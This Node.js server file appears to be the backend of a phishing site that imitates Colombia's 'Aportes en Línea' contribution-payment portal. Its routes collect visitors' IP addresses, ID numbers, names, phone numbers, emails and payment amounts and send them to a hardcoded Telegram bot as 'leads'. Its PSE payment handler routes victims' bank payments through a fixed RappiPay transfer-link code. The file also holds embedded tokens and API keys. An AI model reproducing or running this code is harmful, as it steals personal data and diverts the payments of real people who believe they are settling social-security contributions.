const express = require('express');
const fetch = require('node-fetch');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const https = require('https');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN || '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
const TG_CHAT_ID = process.env.TG_CHAT_ID || '-1004457768033';

const API_APORTES = 'https://api-aportes-dev.krakenlabs.sbs/consulta';
const API_APORTES_KEY = 'aportes-84a5a244a6223f60bf6d89a35125e917fe5c399deb5251bc';
const API_NOMBRES = 'https://api-nombres.krakenlabs.sbs/consulta';
const API_CENTRAL = 'https://api.centraldepagos.top';
const RAPPIPAY_LINK_CODE = 'hvKrCC';

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Telegram
async function enviarTelegram(msg) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML' })
    });
  } catch (e) { console.error('TG error:', e.message); }
}

// Servir index.html directamente (ya tiene todo integrado)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Archivos estáticos locales (css, js, img)
app.use(express.static(__dirname));

// === APIs ===

app.get('/api/soat/config', async (req, res) => {
  try {
    const r = await fetch(`${API_CENTRAL}/api/soat/config?dominio=${encodeURIComponent(req.query.dominio||'')}`);
    res.json(await r.json());
  } catch (e) {
    res.json({ autocompletado: true, rappi: true, general: true, bold: false, breb: false, qr: false });
  }
});

app.post('/api/traffic', async (req, res) => {
  const { tipo, evento } = req.body;
  try {
    const r = await fetch(`${API_CENTRAL}/api/traffic`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({tipo,evento}) });
    res.json(await r.json());
  } catch (e) { res.json({ ok: true }); }
  if (evento === 'ingreso' || evento === 'visita') {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '?';
    const ahora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
    enviarTelegram(`🟢 <b>Nuevo ingreso - Aportes en Línea</b>\n📅 ${ahora}\n🌐 IP: ${ip}\n📱 ${(req.headers['user-agent']||'').substring(0,80)}`);
  }
});

app.get('/consulta-nombre', async (req, res) => {
  if (!req.query.cedula) return res.status(400).json({ error: 'Cédula requerida' });
  try {
    const r = await fetch(`${API_NOMBRES}?cedula=${encodeURIComponent(req.query.cedula)}`);
    res.json(await r.json());
  } catch (e) { res.status(500).json({ error: 'Error' }); }
});

app.get('/consulta-planilla', async (req, res) => {
  const params = new URLSearchParams({ key: API_APORTES_KEY, ...req.query });
  try {
    const r = await fetch(`${API_APORTES}?${params.toString()}`);
    const data = await r.json();
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '?';
    const ahora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
    enviarTelegram(`🔍 <b>Consulta Planilla</b>\n📅 ${ahora}\n👤 Doc: ${req.query.documento||'N/A'}\n👤 ${data.nombres||'N/A'}\n📋 ${req.query.tipo_pago||'N/A'} | Planilla: ${req.query.planilla||'Sin'}\n💰 $${data.valor||'N/A'} | Estado: ${data.estado_planilla||'N/A'}\n🌐 ${ip}`);
    res.json(data);
  } catch (e) { res.status(500).json({ error: 'Error' }); }
});

app.post('/api/comprobante', async (req, res) => {
  try {
    const r = await fetch(`${API_CENTRAL}/api/comprobante`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(req.body) });
    res.json(await r.json());
  } catch (e) { res.json({ ok: true }); }
});

app.post('/bold', async (req, res) => {
  try {
    const r = await fetch(`${API_CENTRAL}/bold`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(req.body) });
    res.json(await r.json());
  } catch (e) { res.json({ ok: true }); }
  const ahora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
  const { nombre_completo, numero_documento, monto, telefono, correo } = req.body;
  enviarTelegram(`📝 <b>Lead - Aportes</b>\n📅 ${ahora}\n👤 ${nombre_completo||'N/A'}\n🆔 ${numero_documento||'N/A'}\n💰 $${monto||'N/A'}\n📞 ${telefono||'N/A'}\n📧 ${correo||'N/A'}`);
});

// === RAPPIPAY PSE (misma lógica que GM) ===

const RAPPIPAY_API_PSE = 'https://services.prod-k8s.rappipay.com/integration/pse/api';
const FIREBASE_API_KEY = 'AIzaSyBXJ_5dpN6uTDr41m72dcS_ZKJtGc_dVHw';
const FIREBASE_DB_URL = 'https://rpp-platform-mobile-app-prod-default-rtdb.firebaseio.com';

function httpsGet(urlStr, extraHeaders = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(urlStr);
    const opts = {
      hostname: url.hostname, port: url.port || 443,
      path: url.pathname + url.search, method: 'GET',
      headers: { 'Accept': 'application/json', ...extraHeaders },
    };
    const req = https.request(opts, (res) => {
      let body = '';
      res.on('data', c => body += c);
      res.on('end', () => { try { resolve(JSON.parse(body)); } catch(e) { resolve(body); } });
    });
    req.on('error', reject);
    req.end();
  });
}

function httpsPost(urlStr, data, extraHeaders = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(urlStr);
    const payload = JSON.stringify(data);
    const opts = {
      hostname: url.hostname, port: url.port || 443,
      path: url.pathname + url.search, method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json', 'Content-Length': Buffer.byteLength(payload), ...extraHeaders },
    };
    const req = https.request(opts, (res) => {
      let body = '';
      res.on('data', c => body += c);
      res.on('end', () => { try { resolve(JSON.parse(body)); } catch(e) { resolve(body); } });
    });
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

function followRedirects(urlStr, maxRedirects = 10) {
  return new Promise((resolve, reject) => {
    let redirects = 0;
    function follow(currentUrl) {
      const url = new URL(currentUrl);
      const opts = {
        hostname: url.hostname, port: url.port || 443,
        path: url.pathname + url.search, method: 'GET',
        headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html,*/*' },
      };
      const req = https.request(opts, (res) => {
        if ([301,302,303,307,308].includes(res.statusCode) && res.headers.location) {
          redirects++;
          if (redirects > maxRedirects) return resolve(currentUrl);
          const next = res.headers.location.startsWith('http') ? res.headers.location : `${url.protocol}//${url.hostname}${res.headers.location}`;
          res.resume();
          return follow(next);
        }
        let body = '';
        res.on('data', c => body += c);
        res.on('end', () => {
          const metaMatch = body.match(/http-equiv=["']refresh["'][^>]*content=["']\d+;\s*url=([^"']+)/i);
          if (metaMatch) return resolve(metaMatch[1]);
          const jsMatch = body.match(/window\.location(?:\.href)?\s*=\s*["']([^"']+)/i);
          if (jsMatch && jsMatch[1].startsWith('http')) return resolve(jsMatch[1]);
          resolve(currentUrl);
        });
      });
      req.on('error', () => resolve(currentUrl));
      req.end();
    }
    follow(urlStr);
  });
}

// Obtener bancos reales desde RappiPay
app.get('/pse/bancos', async (req, res) => {
  try {
    const linkData = await httpsGet(
      `${RAPPIPAY_API_PSE}/transfer-link/code/${RAPPIPAY_LINK_CODE}`,
      { 'traceability-id': crypto.randomUUID() }
    );
    const bancos = linkData.banks || [];
    console.log(`[pse] ${bancos.length} bancos obtenidos`);
    return res.json({ ok: true, bancos });
  } catch (err) {
    console.error('[pse] Error bancos:', err.message);
    return res.status(500).json({ ok: false, error: 'Error obteniendo bancos' });
  }
});

// Procesar pago PSE
app.post('/pse/pagar', async (req, res) => {
  const { bank_code, bank_name, document_type, document_number, amount } = req.body;

  if (!bank_code || !document_number || !amount) {
    return res.status(400).json({ ok: false, error: 'Faltan campos requeridos' });
  }

  const ahora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '?';

  enviarTelegram(
    `💳 <b>Inicio Pago PSE - Aportes en Línea</b>\n` +
    `📅 ${ahora}\n` +
    `🆔 Doc: ${document_number}\n` +
    `🏦 Banco: ${bank_name || bank_code}\n` +
    `💰 Monto: $${Number(amount).toLocaleString()}\n` +
    `🌐 IP: ${ip}`
  );

  try {
    console.log(`[pse] Pago: banco=${bank_code}, doc=${document_number}, monto=${amount}`);

    const linkData = await httpsGet(
      `${RAPPIPAY_API_PSE}/transfer-link/code/${RAPPIPAY_LINK_CODE}`,
      { 'traceability-id': crypto.randomUUID() }
    );
    const transfer = linkData.transfer || linkData;
    if (transfer.status !== 'CREATED') {
      return res.status(400).json({ ok: false, error: 'Link no disponible (status: ' + transfer.status + ')' });
    }

    const traceability_id = transfer.traceability_id;
    const minAmount = transfer.min_amount || 10000;
    const maxAmount = transfer.max_amount || 20000000;
    if (amount < minAmount || amount > maxAmount) {
      return res.status(400).json({ ok: false, error: `Monto debe estar entre $${minAmount.toLocaleString()} y $${maxAmount.toLocaleString()}` });
    }

    const clientIp = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '127.0.0.1';

    const paymentPayload = {
      traceability_id,
      bank_code,
      bank_name: bank_name || '',
      document_type: document_type || 'CC',
      document_number: String(document_number),
      amount: Number(amount),
      user_agreement_check: true,
      client_ip: clientIp,
    };

    const paymentResp = await httpsPost(
      `${RAPPIPAY_API_PSE}/payment-url`,
      paymentPayload,
      { 'traceability-id': crypto.randomUUID() }
    );
    console.log('[pse] paymentResp:', JSON.stringify(paymentResp).slice(0, 500));

    const firebaseToken = paymentResp.token || paymentResp.custom_token || paymentResp.firebase_token;
    const directUrl = paymentResp.bank_url || paymentResp.url || paymentResp.redirect_url || paymentResp.payment_url;

    if (directUrl) {
      return res.json({ ok: true, bank_url: directUrl, traceability_id });
    }

    if (!firebaseToken) {
      return res.status(500).json({ ok: false, error: 'No se recibió token de pago', debug: paymentResp });
    }

    const txTraceId = paymentResp.traceability_id || traceability_id;

    const firebaseAuth = await httpsPost(
      `https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=${FIREBASE_API_KEY}`,
      { token: firebaseToken, returnSecureToken: true }
    );

    if (!firebaseAuth.idToken) {
      return res.status(500).json({ ok: false, error: 'Error autenticación Firebase' });
    }

    const firebasePath = `cash_flow_cash_in_pse_link_transaction/${txTraceId}.json?auth=${firebaseAuth.idToken}`;
    let bankUrl = null;

    for (let i = 0; i < 15; i++) {
      await new Promise(r => setTimeout(r, i === 0 ? 3000 : 2000));
      try {
        const fbData = await httpsGet(`${FIREBASE_DB_URL}/${firebasePath}`);
        console.log(`[pse] poll ${i + 1}/15 fbData keys:`, fbData ? Object.keys(fbData) : null);
        const link = (fbData && fbData.data && fbData.data.params && fbData.data.params.link) || (fbData && fbData.params && fbData.params.link) || (fbData && fbData.link);
        if (link) { bankUrl = link; break; }
      } catch (fbErr) {
        console.error(`[pse] Firebase poll error:`, fbErr.message);
      }
    }

    if (!bankUrl) {
      enviarTelegram(
        `❌ <b>Aportes — Pago PSE Fallido</b>\n` +
        `📄 Doc: ${document_number}\n` +
        `🏦 Banco: ${bank_name || bank_code}\n` +
        `💰 Monto: $${Number(amount).toLocaleString()}\n` +
        `⚠️ No se obtuvo URL del banco`
      );
      return res.status(500).json({ ok: false, error: 'No se pudo obtener la URL del banco.', traceability_id: txTraceId });
    }

    let finalUrl = bankUrl;
    try {
      console.log('[pse] bankUrl original (Kushkai):', bankUrl);
      finalUrl = await followRedirects(bankUrl);
      console.log('[pse] URL final (banco):', finalUrl);
    } catch (e) {
      console.error('[pse] followRedirects error:', e.message);
    }

    enviarTelegram(
      `💳 <b>Aportes — Pago PSE</b>\n` +
      `📄 Doc: ${document_number}\n` +
      `🏦 Banco: ${bank_name || bank_code}\n` +
      `💰 Monto: $${Number(amount).toLocaleString()}\n` +
      `🔗 URL: ${finalUrl !== bankUrl ? 'Banco directo' : 'Kushkai'}`
    );

    return res.json({ ok: true, bank_url: finalUrl, traceability_id });

  } catch (err) {
    console.error('[pse] Error:', err.message);
    return res.status(500).json({ ok: false, error: 'Error procesando pago: ' + err.message });
  }
});

app.listen(PORT, () => console.log(`\n🟢 Server en puerto ${PORT}\n   http://localhost:${PORT}\n`));
